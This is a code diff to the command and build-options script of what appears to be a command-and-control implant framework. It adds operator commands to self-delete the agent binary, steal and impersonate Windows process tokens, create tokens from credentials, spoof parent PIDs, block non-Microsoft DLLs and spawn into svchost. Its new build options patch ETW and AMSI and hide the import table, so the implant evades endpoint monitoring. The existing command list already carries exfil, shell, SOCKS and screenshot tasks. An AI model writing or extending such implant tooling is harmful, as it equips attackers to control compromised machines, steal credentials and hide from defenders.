@@ -301,9 +301,38 @@ function RegisterCommands(listenerType)
     cmd_zip_unix.addArgString("path", true);
     cmd_zip_unix.addArgString("zip_path", true);
 
+    // ─── selfdel ────────────────────────────────────────────────────────
+    let cmd_selfdel = ax.create_command("selfdel", "Self-delete agent binary from disk", "selfdel", "Task: self-delete");
+
+    // ─── token ──────────────────────────────────────────────────────────
+    let _cmd_token_steal = ax.create_command("steal", "Steal token from a process", "token steal 1234", "Task: steal token");
+    _cmd_token_steal.addArgInt("pid", true, "Process ID to steal token from");
+    let _cmd_token_impersonate = ax.create_command("impersonate", "Impersonate a stolen token", "token impersonate 1", "Task: impersonate token");
+    _cmd_token_impersonate.addArgInt("id", true, "Token vault ID");
+    let _cmd_token_make = ax.create_command("make", "Create token with credentials", "token make DOMAIN user pass", "Task: make token");
+    _cmd_token_make.addArgString("domain", true, "Domain name");
+    _cmd_token_make.addArgString("user", true, "Username");
+    _cmd_token_make.addArgString("password", true, "Password");
+    let _cmd_token_list = ax.create_command("list", "List tokens in vault", "token list", "Task: list tokens");
+    let _cmd_token_remove = ax.create_command("remove", "Remove a token from vault", "token remove 1", "Task: remove token");
+    _cmd_token_remove.addArgInt("id", true, "Token vault ID");
+    let _cmd_token_privs = ax.create_command("privs", "List current token privileges", "token privs", "Task: token privileges");
+    let cmd_token = ax.create_command("token", "Token impersonation management");
+    cmd_token.addSubCommands([_cmd_token_steal, _cmd_token_impersonate, _cmd_token_make, _cmd_token_list, _cmd_token_remove, _cmd_token_privs]);
+
+    // ─── config ─────────────────────────────────────────────────────────
+    let _cmd_config_ppid = ax.create_command("ppid", "Set parent PID for process spoofing", "config ppid 1234", "Task: set PPID spoofing");
+    _cmd_config_ppid.addArgInt("pid", true, "Parent process ID (0 to disable)");
+    let _cmd_config_blockdlls = ax.create_command("blockdlls", "Toggle non-Microsoft DLL blocking", "config blockdlls 1", "Task: set block DLLs");
+    _cmd_config_blockdlls.addArgInt("enabled", true, "1=enabled, 0=disabled");
+    let _cmd_config_spawnto = ax.create_command("spawnto", "Set sacrificial process path", "config spawnto C:\\Windows\\System32\\svchost.exe", "Task: set spawn-to");
+    _cmd_config_spawnto.addArgString("path", true, "Full path to sacrificial process");
+    let cmd_config = ax.create_command("config", "Runtime agent configuration");
+    cmd_config.addSubCommands([_cmd_config_ppid, _cmd_config_blockdlls, _cmd_config_spawnto]);
+
     // ─── Command groups ─────────────────────────────────────────────────
-    let commands_win  = ax.create_commands_group("__NAME__", [cmd_burst, cmd_cat_win,  cmd_cp, cmd_cd_win,  cmd_disks, cmd_download_win,  cmd_execute, cmd_exfil, cmd_exit, cmd_getuid, cmd_interact, cmd_jobs, cmd_kill, cmd_link, cmd_lportfwd, cmd_ls_win,  cmd_mv, cmd_mkdir_win,  cmd_powershell, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm_win,  cmd_rportfwd, cmd_run_win,  cmd_screenshot, cmd_sleep, cmd_socks, cmd_shell_win,  cmd_terminate, cmd_unlink, cmd_upload_win,  cmd_zip_win] );
-    let commands_unix = ax.create_commands_group("__NAME__", [cmd_burst, cmd_cat_unix, cmd_cp, cmd_cd_unix,            cmd_download_unix,             cmd_exfil, cmd_exit, cmd_getuid, cmd_interact, cmd_jobs, cmd_kill, cmd_link, cmd_lportfwd, cmd_ls_unix, cmd_mv, cmd_mkdir_unix, cmd_profile, cmd_ps, cmd_pwd,               cmd_rm_unix, cmd_rportfwd, cmd_run_unix, cmd_screenshot, cmd_sleep, cmd_socks, cmd_shell_unix, cmd_terminate, cmd_unlink, cmd_upload_unix, cmd_zip_unix] );
+    let commands_win  = ax.create_commands_group("__NAME__", [cmd_burst, cmd_cat_win,  cmd_config, cmd_cp, cmd_cd_win,  cmd_disks, cmd_download_win,  cmd_execute, cmd_exfil, cmd_exit, cmd_getuid, cmd_interact, cmd_jobs, cmd_kill, cmd_link, cmd_lportfwd, cmd_ls_win,  cmd_mv, cmd_mkdir_win,  cmd_powershell, cmd_profile, cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm_win,  cmd_rportfwd, cmd_run_win,  cmd_screenshot, cmd_selfdel, cmd_sleep, cmd_socks, cmd_shell_win,  cmd_terminate, cmd_token, cmd_unlink, cmd_upload_win,  cmd_zip_win] );
+    let commands_unix = ax.create_commands_group("__NAME__", [cmd_burst, cmd_cat_unix, cmd_cp, cmd_cd_unix,            cmd_download_unix,             cmd_exfil, cmd_exit, cmd_getuid, cmd_interact, cmd_jobs, cmd_kill, cmd_link, cmd_lportfwd, cmd_ls_unix, cmd_mv, cmd_mkdir_unix, cmd_profile, cmd_ps, cmd_pwd,               cmd_rm_unix, cmd_rportfwd, cmd_run_unix, cmd_screenshot, cmd_selfdel, cmd_sleep, cmd_socks, cmd_shell_unix, cmd_terminate, cmd_unlink, cmd_upload_unix, cmd_zip_unix] );
 
     return {
         commands_windows: commands_win,
@@ -431,6 +460,59 @@ function GenerateUI(listeners_type)
         timeEndTime.setVisible(checked);
     });
 
+    // ── Evasion options ────────────────────────────────────────────────
+    let hline5 = form.create_hline()
+
+    let checkIatHiding = form.create_check("IAT Hiding");
+    checkIatHiding.setChecked(true);
+
+    let checkDebug = form.create_check("Debug build");
+
+    let hline6 = form.create_hline()
+
+    let checkPatchETW = form.create_check("Patch ETW (NtTraceEvent)");
+    let checkPatchAMSI = form.create_check("Patch AMSI (AmsiScanBuffer)");
+    let checkPPIDSpoof = form.create_check("PPID Spoofing");
+    let checkBlockDLLs = form.create_check("Block non-Microsoft DLLs");
+
+    // ── Guardrails (optional) ──────────────────────────────────────────
+    let hline7 = form.create_hline()
+
+    let checkGuardrails = form.create_check("Enable Guardrails");
+    let labelGuardIP = form.create_label("Allowed IP:");
+    let textGuardIP = form.create_textline("");
+    textGuardIP.setPlaceholder("e.g. 10.0.0.0/24 or empty");
+    let labelGuardHost = form.create_label("Allowed Hostname:");
+    let textGuardHost = form.create_textline("");
+    textGuardHost.setPlaceholder("exact hostname or empty");
+    let labelGuardUser = form.create_label("Allowed Username:");
+    let textGuardUser = form.create_textline("");
+    textGuardUser.setPlaceholder("exact username or empty");
+    let labelGuardDomain = form.create_label("Allowed Domain:");
+    let textGuardDomain = form.create_textline("");
+    textGuardDomain.setPlaceholder("exact domain or empty");
+
+    labelGuardIP.setVisible(false);
+    textGuardIP.setVisible(false);
+    labelGuardHost.setVisible(false);
+    textGuardHost.setVisible(false);
+    labelGuardUser.setVisible(false);
+    textGuardUser.setVisible(false);
+    labelGuardDomain.setVisible(false);
+    textGuardDomain.setVisible(false);
+
+    form.connect(checkGuardrails, "stateChanged", function() {
+        let checked = checkGuardrails.isChecked();
+        labelGuardIP.setVisible(checked);
+        textGuardIP.setVisible(checked);
+        labelGuardHost.setVisible(checked);
+        textGuardHost.setVisible(checked);
+        labelGuardUser.setVisible(checked);
+        textGuardUser.setVisible(checked);
+        labelGuardDomain.setVisible(checked);
+        textGuardDomain.setVisible(checked);
+    });
+
     layout.addWidget(hline3, 13, 0, 1, 2);
     layout.addWidget(checkKillDate, 14, 1, 1, 1);
     layout.addWidget(labelKillDate, 15, 0, 1, 1);
@@ -442,6 +524,24 @@ function GenerateUI(listeners_type)
     layout.addWidget(timeStartTime, 18, 1, 1, 1);
     layout.addWidget(labelEndTime, 19, 0, 1, 1);
     layout.addWidget(timeEndTime, 19, 1, 1, 1);
+    layout.addWidget(hline5, 20, 0, 1, 2);
+    layout.addWidget(checkIatHiding, 21, 1, 1, 1);
+    layout.addWidget(checkDebug, 22, 1, 1, 1);
+    layout.addWidget(hline6, 23, 0, 1, 2);
+    layout.addWidget(checkPatchETW, 24, 1, 1, 1);
+    layout.addWidget(checkPatchAMSI, 25, 1, 1, 1);
+    layout.addWidget(checkPPIDSpoof, 26, 1, 1, 1);
+    layout.addWidget(checkBlockDLLs, 27, 1, 1, 1);
+    layout.addWidget(hline7, 28, 0, 1, 2);
+    layout.addWidget(checkGuardrails, 29, 1, 1, 1);
+    layout.addWidget(labelGuardIP, 30, 0, 1, 1);
+    layout.addWidget(textGuardIP, 30, 1, 1, 1);
+    layout.addWidget(labelGuardHost, 31, 0, 1, 1);
+    layout.addWidget(textGuardHost, 31, 1, 1, 1);
+    layout.addWidget(labelGuardUser, 32, 0, 1, 1);
+    layout.addWidget(textGuardUser, 32, 1, 1, 1);
+    layout.addWidget(labelGuardDomain, 33, 0, 1, 1);
+    layout.addWidget(textGuardDomain, 33, 1, 1, 1);
 
     form.connect(comboOS, "currentTextChanged", function(text) {
         comboFormat.clear();
@@ -483,6 +583,17 @@ function GenerateUI(listeners_type)
     container.put("is_workingtime", checkWorkTime)
     container.put("start_time", timeStartTime)
     container.put("end_time", timeEndTime)
+    container.put("iat_hiding", checkIatHiding)
+    container.put("debug_build", checkDebug)
+    container.put("patch_etw", checkPatchETW)
+    container.put("patch_amsi", checkPatchAMSI)
+    container.put("ppid_spoof", checkPPIDSpoof)
+    container.put("block_dlls", checkBlockDLLs)
+    container.put("guardrails", checkGuardrails)
+    container.put("guard_ip", textGuardIP)
+    container.put("guard_hostname", textGuardHost)
+    container.put("guard_username", textGuardUser)
+    container.put("guard_domain", textGuardDomain)
 
     let innerPanel = form.create_panel()
     innerPanel.setLayout(layout)
